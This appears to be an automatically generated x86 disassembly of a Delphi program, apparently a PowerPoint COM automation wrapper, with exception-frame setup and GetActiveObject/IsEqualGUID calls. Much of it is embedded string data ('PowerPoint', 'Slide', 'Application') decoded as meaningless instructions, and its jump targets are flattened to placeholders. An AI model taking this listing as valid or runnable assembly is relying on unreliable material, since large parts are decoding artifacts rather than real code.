inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff4
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
inc edi
inc edi
add bh dl
pop es
inc edi
add cl ah
pop es
inc edi
add bl ch
pop es
inc edi
add [ edx ] al
add [ eax ] al
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
popad
arpl [ eax + 0x54 ] bp
outsd
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
jbe r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x10 ]
sub eax ebx
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40f94c
inc ebx
dec edi
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + ebx * 4 ]
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40f94c
inc ebx
dec edi
jne r-xdata
jmp r-xdata
or [ edi ] al
jb r-xdata
add [ ecx + ecx + 0x9d80047 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
or [ edi ] eax
push eax
add [ eax ] al
add [ eax ] bl
popfd
inc ecx
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
js r-xdata
inc edi
add [ ebx ] al
or [ edi ] eax
add [ eax ] al
add [ eax ] al
mov ah 0x9
inc edi
add al bl
or [ edi ] eax
outsb
je r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
int 0x7
inc edi
popad
arpl [ ebp + 0x9 ] sp
dec edi
insb
push ebx
jb r-xdata
add al cl
or eax 0x3dc40047
inc edx
add [ eax ] cl
aas
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax + 0x2400470f ] ch
or eax 0x2b900047
inc eax
add al dh
or eax 0xdec0047
inc edi
add [ eax - 0x6fffbfd5 ] dl
sub eax [ eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
inc esp
add [ eax ] al
add [ edx ] cl
push esp
dec edi
insb
push ebx
jb r-xdata
inc edi
add [ edi * 4 + 0x3e200041 ] dh
inc edx
add [ eax - 0x44 ] dl
inc ecx
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
test [ eax ] 0x4c0047
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
jo r-xdata
imul esi [ ebx + 0x70 ] 0x68637461
lea eax [ eax ]
int3
push 0x0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405384
add esp 0x4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470d09
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4054a4
retn
inc edi
inc edi
hlt
jb r-xdata
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
sub edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40f94c
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov edx [ edx + ebx * 4 ]
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40f94c
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xd ] bh
inc eax
add al bl
or [ edi ] eax
pop es
or dl [ edi + ecx * 2 + 0x6c ]
push ebx
jb r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
jmp r-xdata
add [ eax - 0x80000000 ] al
add al 0x0
adc [ edx + 0x65 ] edx
insd
jb r-xdata
push esi
call IsEqualGUID
test al al
je r-xdata
dec ebp
popad
arpl [ eax + 0x69 ] bp
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x52110004 ] al
insd
or [ edi ] eax
adc al 0x9e
inc ecx
add [ 0x6c4f0900 ] al
push ebx
jb r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_470af4
mov eax ebx
call sub_403444
xor eax eax
jmp r-xdata
outsb
dec esi
popad
insd
mov eax eax
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
inc eax
add [ edi + ecx + 0xfa40047 ] cl
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410b0002 ] al
jne r-xdata
add [ eax ] al
adc [ eax ] al
mov [ edi ] cs
inc edi
add [ edi + ecx + 0x10047 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
je r-xdata
outsd
add [ eax ] al
test dl dl
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x7 ] si
inc edi
add [ edi + ecx + 0x47 ] dh
add [ eax + 0x100470f ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0003 ] al
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_470aa0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403444
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x30 ]
add eax 0x20
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_470af4
mov eax ebx
call sub_403444
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_470b04
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_470fd0
sub_470b24
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_470fe0
sub_470d24
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_423aa8
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ esi + 0x30 ]
inc [ eax + 0x38 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_470a74
mov [ esi + 0x38 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_470d78
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ esi + 0x38 ]
call sub_470d14
mov eax [ esi + 0x38 ]
push eax
call sub_470b24
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax + 0x38 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423af4
test bl bl
jle r-xdata
mov eax [ esi + 0x38 ]
call sub_403390
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_470dc8
push ebx
mov ebx eax
mov eax ebx
call sub_423ef8
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_470f8c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
sub_470df0
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_470f3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_470f74
sub al 0x1
jb r-xdata
mov eax esi
call sub_405b50
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
call sub_418758
test al al
jne r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470f41
lea eax [ ebp - 0x24 ]
call sub_40482c
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404144
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_46f8bc
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_46f8bc
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_405b50
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
mov esi eax
mov eax esi
call sub_418758
test al al
jne r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x30 ]
call sub_46f890
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x30 ]
call sub_46f864
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x20 ]
mov ecx 0x1
pop edx
call sub_4092d8
push esi
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f6c8
call sub_403b5c
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
call sub_404978
mov eax [ ebp - 0x24 ]
mov ecx esi
mov edx [ ebx + 0x30 ]
call sub_46f8f4
jmp r-xdata
sub_470fa8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403444
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_470ff0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_471015
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47101c
retn
sub_47103c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_471061
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471068
retn
sub_471074
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_471099
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4710a0
retn
sub_4710ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4710d1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4710d8
retn
sub_471121
rcpps xmm5 [ ecx + ebp * 2 + 0x64 ]
push ebx
push 0x6957776f
outsb
outsd
ja r-xdata
stosb [ edi ]
add [ eax + 0x26 ] ah
cmp ecx [ eax + edx * 2 ]
outsd
ja r-xdata
adc [ eax ] eax
add [ ebx + 0x34 ] edx
dec ecx
xchg ecx eax
xchg ecx eax
pop edx
iretd
add [ eax ] al
stosb [ edi ]
add [ eax + 0x26 ] ah
cmp ecx [ eax + edx * 2 ]
outsd
ja r-xdata
jb r-xdata
dec ecx
jb r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
aam 0x11
inc eax
add [ ecx ] al
push esp
xor al 0x49
xchg ecx eax
xchg ecx eax
pop edx
iretd
outsd
imul ebp [ esi + 0x74 ] r-xdata
push eax
jb r-xdata
outsd
imul ebp [ esi + 0x74 ] 0xc5058
rol [ eax + 0x12 ] 0x47
add [ edi ] cl
or dl [ ebx + 0x6c ]
imul esp [ ebp + 0x52 ] 0x65676e61
aam 0x11
jae r-xdata
adc al [ edi ]
outsb
je r-xdata
inc eax
je r-xdata
inc eax
add [ ecx ] al
imul esi [ ecx + ecx * 2 ] 0xffffff91
xchg ecx eax
pop edx
iretd
push edx
popad
outsb
aam 0x11
xchg ecx eax
xchg ecx eax
pop edx
iretd
outsd
outsb
aam 0x11
inc eax
add [ ecx ] al
popfd
xor al 0x49
sub_47118c
dec [ ebp + 0x11940040 ]
inc edi
add [ edi ] cl
push cs
inc esp
outsd
arpl [ ebp + 0x6d ] si
outsb
je r-xdata
outsd
ja r-xdata
imul ebp [ esi + 0x64 ] 0x11d4776f
inc eax
add [ ecx ] al
push edi
xor al 0x49
xchg ecx eax
xchg ecx eax
pop edx
iretd
pushad
cmp ecx [ es : eax + edx * 2 ]
outsd
ja r-xdata
jb r-xdata
insb
jb r-xdata
aam 0x11
inc eax
add [ ecx ] al
imul esi [ ecx + ecx * 2 ] 0xffffff91
xchg ecx eax
pop edx
iretd
outsd
imul ebp [ esi + 0x74 ] 0x5e5058
or al [ ebx ]
push ebx
insb
or [ ebx + 0x65 ] edx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x3 ] si
je r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x295058
inc eax
add [ ebx + 0x47137cc0 ] cl
jb r-xdata
add [ ecx + edx + 0x11580040 ] al
inc edi
add [ eax ] cl
adc eax [ edi ]
or [ esp + edx * 2 ] ch
push eax
outsd
ja r-xdata
jo r-xdata
or [ edi + 0x6f ] dl
jb r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
push edi
outsd
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
imul esp [ ebx + 0x61 ] 0x6e6f6974
push edi
imul ebp [ esi + 0x64 ] 0x6542776f
outsw
jb r-xdata
push edx
imul esp [ edi + 0x68 ] 0x696c4374
arpl [ ebx ] bp
add ecx [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
push 0x65676e61
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
push edi
imul ebp [ esi + 0x64 ] 0x6553776f
insb
outsd
outsb
inc edx
outsd
outsd
imul ebp [ edi + 0x6e ] 0x73657250
outsb
inc esp
outsd
jne r-xdata
je r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11580040 ] al
inc edi
add ah cl
adc [ eax ] al
mov eax eax
jl r-xdata
imul ebp [ edi + 0x6e ] 0x646e6957
outsd
ja r-xdata
jb r-xdata
or al [ ebx ]
push ebx
insb
or [ ebx + 0x65 ] edx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x3 ] si
insb
jb r-xdata
imul ebp [ edi + 0x6e ] 0x65766153
je r-xdata
outsd
outsb
push eax
jb r-xdata
insb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x7080300
inc ecx
push ebx
outsb
jb r-xdata
push eax
jb r-xdata
outsd
imul esp [ ebx + 0x61 ] 0x6e6f6974
push edi
imul ebp [ esi + 0x64 ] 0x6542776f
outsw
add [ eax ] cl
sub eax 0x776f5054
jb r-xdata
inc edi
insb
add [ ecx + edx + 0x11580040 ] al
inc edi
add ah cl
adc [ eax ] al
nop
jb r-xdata
outsw
imul ebp [ edi + 0x6e ] 0x7080200
jae r-xdata
adc al 0x47
add [ eax ] cl
push esp
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
imul esp [ ebx + 0x61 ] 0x6e6f6974
push eax
jb r-xdata
or al [ eax + edx * 2 ]
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
push eax
inc ecx
push ebx
pop es
outsd
outsb
inc ebx
insb
outsd
jae r-xdata
je r-xdata
jae r-xdata
outsb
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or al [ ebx ]
push ebx
insb
or [ ebx + 0x65 ] edx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x3 ] si
imul ebp [ edi + 0x6e ] 0x40118400
add ah cl
adc [ edi ] eax
lodsb [ esi ]
jae r-xdata
or al [ eax + edx * 2 ]
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
push eax
inc ecx
push ebx
outsb
outsb
add [ edx ] al
or [ edi ] al
outsb
je r-xdata
insb
jb r-xdata
dec edi
jae r-xdata
je r-xdata
jae r-xdata
outsb
jb r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
outsb
outsd
outsb
push ebx
popad
jbe r-xdata
je r-xdata
outsb
push eax
outsd
ja r-xdata
outsb
outsb
je r-xdata
imul esp [ ebp ] r-xdata
jae r-xdata
outsd
je r-xdata
insb
jb r-xdata
adc eax 0x25080047
imul esp [ ebx + 0x61 ] 0x6e6f6974
push eax
jb r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
jb r-xdata
jb r-xdata
outsb
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
outsb
outsb
je r-xdata
adc [ eax ] eax
int3
je r-xdata
add [ ecx + edx + 0x11cc0040 ] al
inc edi
pop edi
push eax
jb r-xdata
or al [ eax + edx * 2 ]
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
push eax
or al [ eax + edx * 2 ]
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
push eax
jb r-xdata
add [ edx ] al
or [ edi ] al
outsd
je r-xdata
add [ ebp + 0x16300040 ] cl
inc edi
add [ eax ] cl
push esp
push eax
outsd
ja r-xdata
jb r-xdata
add [ ecx + edx + 0x11cc0040 ] al
inc edi
add [ eax + r-xdata ] dl
or [ edx ] ch
pop edi
push eax
jb r-xdata
jb r-xdata
outsd
outsb
or [ edi ] al
jae r-xdata
push ebx
jae r-xdata
jb r-xdata
jo r-xdata
ja r-xdata
inc edi
add [ eax ] cl
sub dl [ eax + edx * 2 + 0x6f ]
outsd
outsb
add [ ecx + edx + 0x11cc0040 ] al
inc edi
add [ eax ] cl
jae r-xdata
jae r-xdata
popad
jae r-xdata
add [ esp + edx + 0x26080047 ] ch
push esp
adc [ edi ] eax
nop
movsb [ edi ] [ esi ]
push ss
inc edi
add [ eax ] cl
and al 0x54
push eax
outsd
ja r-xdata
jb r-xdata
je r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
imul esp [ ebx + 0x61 ] 0x6e6f6974
je r-xdata
jb r-xdata
push eax
outsd
ja r-xdata
inc eax
jae r-xdata
or al [ eax + edx * 2 ]
jb r-xdata
push esp
inc ecx
push ebx
outsb
jb r-xdata
outsb
je r-xdata
or al [ ebx ]
push ebx
insb
push es
pop edi
push ebx
insb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x3 ] si
imul esp [ ebp ] 0x41070802
push ebx
outsb
je r-xdata
push esp
push eax
outsd
adc eax 0x2a080047
imul esp [ ebx + 0x61 ] 0x6e6f6974
dec esi
ja r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
adc [ eax ] eax
int3
outsb
je r-xdata
add [ ecx + edx + 0x11cc0040 ] al
inc edi
add [ ebp + 0x14500040 ] cl
inc edi
add [ eax ] cl
push esp
push eax
outsd
ja r-xdata
pop edi
and al 0x54
outsd
outsb
pop edi
push eax
jb r-xdata
insb
jb r-xdata
outsb
je r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
jb r-xdata
imul ebp [ esi + 0x64 ] 0x8400776f
adc [ eax ] eax
int3
push edi
imul ebp [ esi + 0x64 ] 0x6544776f
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
outsb
jbe r-xdata
outsb
je r-xdata
push edi
imul ebp [ esi + 0x64 ] 0x6341776f
je r-xdata
outsd
outsb
imul esp [ ebx + 0x61 ] 0x6e6f6974
push eax
jb r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
or [ edx ] dl
inc edi
add [ ebp + edx + 0x24080047 ] bh
push esp
outsb
je r-xdata
outsb
jae r-xdata
pop es
je r-xdata
insb
je r-xdata
push esp
push eax
outsd
ja r-xdata
test [ ecx ] dl
inc eax
add ah cl
adc [ edi ] eax
or [ 0x25080047 ] dl
je r-xdata
test [ ecx ] dl
jae r-xdata
push 0x65
inc edx
pop ss
inc edi
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
add [ eax ] cl
sub [ eax + edx * 2 + 0x6f ] dl
ja r-xdata
imul esp [ ebp + 0x53 ] 0x57776f68
imul ebp [ esi + 0x64 ] 0x8400776f
imul ebp [ esi + 0x64 ] 0x8400776f
adc [ eax ] eax
int3
insb
imul esp [ ebp + 0x53 ] 0x42776f68
imul ebp [ gs : bp ] 0x41070802
push ebx
outsb
jb r-xdata
jb r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
pop es
jae r-xdata
imul esp [ ebx + 0x61 ] 0x6e6f6974
je r-xdata
or al [ edx ]
push edi
outsb
push cs
inc esp
outsd
arpl [ ebp + 0x6d ] si
jo r-xdata
add [ eax ] cl
adc al [ edi ]
mov esp 0x8004715
je r-xdata
or al [ eax + edx * 2 ]
push esp
or al [ edx ]
push edi
outsb
push cs
inc esp
outsd
arpl [ ebp + 0x6d ] si
outsb
pop edi
push eax
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
push eax
outsd
outsb
dec esi
ja r-xdata
outsb
jb r-xdata
inc edi
add [ eax ] cl
and eax 0x776f5054
jb r-xdata
inc eax
add ah cl
adc [ edi ] eax
nop
adc eax 0x2a080047
outsb
test [ ecx ] dl
inc eax
add [ ecx + edx ] bl
inc edi
outsb
insb
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
je r-xdata
jb r-xdata
push edi
outsb
or al [ edx ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc edi
add [ ebx + 0x471700c0 ] cl
test [ ecx ] dl
inc eax
add [ ecx + edx ] bl
pop edi
push eax
jb r-xdata
add [ ebx ] al
je r-xdata
insb
dec edi
jae r-xdata
popad
je r-xdata
jb r-xdata
push edi
outsb
rcpps xmm5 [ ecx + ebp * 2 + 0x64 ]
push ebx
push 0x6957776f
outsb
outsd
or al [ edx ]
arpl [ edx + ecx + 0x2 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
or al [ edx ]
push edi
outsb
rcpps xmm5 [ ecx + ebp * 2 + 0x64 ]
push ebx
push 0x6957776f
outsb
outsd
ja r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x2 ] si
ja r-xdata
outsd
jo r-xdata
add [ ebx + 0x471760c0 ] cl
add [ eax ] cl
sub [ eax + edx * 2 + 0x6f ] dl
ja r-xdata
imul esp [ ebx + 0x61 ] 0x6e6f6974
push ebx
insb
imul esp [ ebp + 0x53 ] 0x4e776f68
js r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
arpl [ edx + ecx + 0x2 ] si
jae r-xdata
adc [ eax ] eax
sbb al 0x11
jo r-xdata
arpl [ edx + ecx + 0x4 ] si
push eax
push 0x65
outsb
je r-xdata
insb
outsd
outsb
daa
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
test [ ecx ] dl
inc eax
add [ ecx + edx ] bl
inc edi
ja r-xdata
insb
je r-xdata
jb r-xdata
outsb
je r-xdata
je r-xdata
imul esp [ ebx + 0x61 ] 0x6e6f6974
push ebx
insb
bound ebp [ edx + 0x65 ]
je r-xdata
or cl [ eax ]
push ebx
insb
push edx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jae r-xdata
je r-xdata
jb r-xdata
or al [ eax + edx * 2 ]
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
jo r-xdata
outsb
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
push eax
jb r-xdata
push ebx
insb
imul esp [ ebp ] 0x41070802
push ebx
outsb
add ah cl
adc [ edi ] eax
sbb [ eax ] bl
inc edi
add [ eax ] cl
jo r-xdata
add [ ebx + 0x4717c0c0 ] cl
add [ eax ] cl
and dl [ eax + edx * 2 + 0x6f ]
ja r-xdata
imul esp [ ebx + 0x61 ] 0x6e6f6974
push ebx
insb
imul esp [ ebp + 0x53 ] 0x4e776f68
js r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
je r-xdata
je r-xdata
push eax
jne r-xdata
outsd
outsb
je r-xdata
jb r-xdata
je r-xdata
outsb
je r-xdata
inc edi
add [ ebx + 0x4718dcc0 ] cl
add [ eax ] cl
sub [ eax + edx * 2 + 0x6f ] dl
ja r-xdata
push edx
jo r-xdata
lea eax [ eax ]
js r-xdata
push eax
jb r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
outsb
je r-xdata
jae r-xdata
push ebx
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
je r-xdata
imul esp [ ebx + 0x61 ] 0x6e6f6974
push ebx
insb
imul esp [ ebp + 0x53 ] 0x45776f68
insb
push 0x6957776f
outsb
outsd
ja r-xdata
rcpps xmm5 [ ecx + ebp * 2 + 0x64 ]
add dl [ edi + 0x6e ]
push ebx
outsd
outsb
je r-xdata
jo r-xdata
inc edi
add [ eax + r-xdata ] dl
or [ esp + edx * 2 ] ch
push eax
outsd
ja r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x6c707041
imul esp [ ebx + 0x61 ] 0x6e6f6974
inc ebx
outsd
insb
outsd
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
outsb
inc ebx
push 0x65676e61
add [ fs : edx ] al
outsd
arpl [ ecx + ebp * 2 + 0x6f ] si
je r-xdata
jb r-xdata
insb
push ebx
insb
imul esp [ ebp + 0x53 ] 0x63656c65
outsd
outsb
inc edi
add [ eax ] cl
sub edx [ eax + edx * 2 + 0x6f ]
ja r-xdata
imul esp [ ebp + 0x52 ] 0x65676e61
add [ ecx + edx + 0x123c0040 ] al
je r-xdata
push esp
push eax
outsd
ja r-xdata
add [ ecx + edx + 0x11cc0040 ] al
inc edi
add [ eax ] bl
sbb [ edi ] al
or [ edi ] ah
pop edi
push eax
jb r-xdata
add cl [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
arpl [ gs : edx + ecx + 0x2 ] si
je r-xdata
push eax
insb
adc [ edi ] eax
int3
jb r-xdata
imul esp [ ebx + 0x61 ] 0x6e6f6974
push eax
jb r-xdata
arpl [ eax + 0x65 ] bp
insd
inc ebx
push 0x65676e61
or cl [ eax ]
push ebx
insb
push edx
popad
outsb
or dl [ gs : bp + di + 0x6c ]
imul esp [ ebp + 0x52 ] 0x65676e61
add [ ecx + edx + 0x123c0040 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
or [ edi ] al
add [ fs : edx ] al
outsd
outsb
push eax
jb r-xdata
push eax
jb r-xdata
adc [ eax ] eax
cmp al 0x12
outsd
outsb
jae r-xdata
or al [ eax + edx * 2 ]
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
push eax
arpl [ gs : eax + eax - 0x7c ] si
adc [ eax ] eax
sbb al 0x11
pop es
outsb
inc ebp
arpl [ gs : esi + eax + 0x45 ] si
imul esp [ ebp + 0x53 ] 0x57776f68
imul ebp [ esi + 0x64 ] 0x70a776f
outsd
outsb
add ah ah
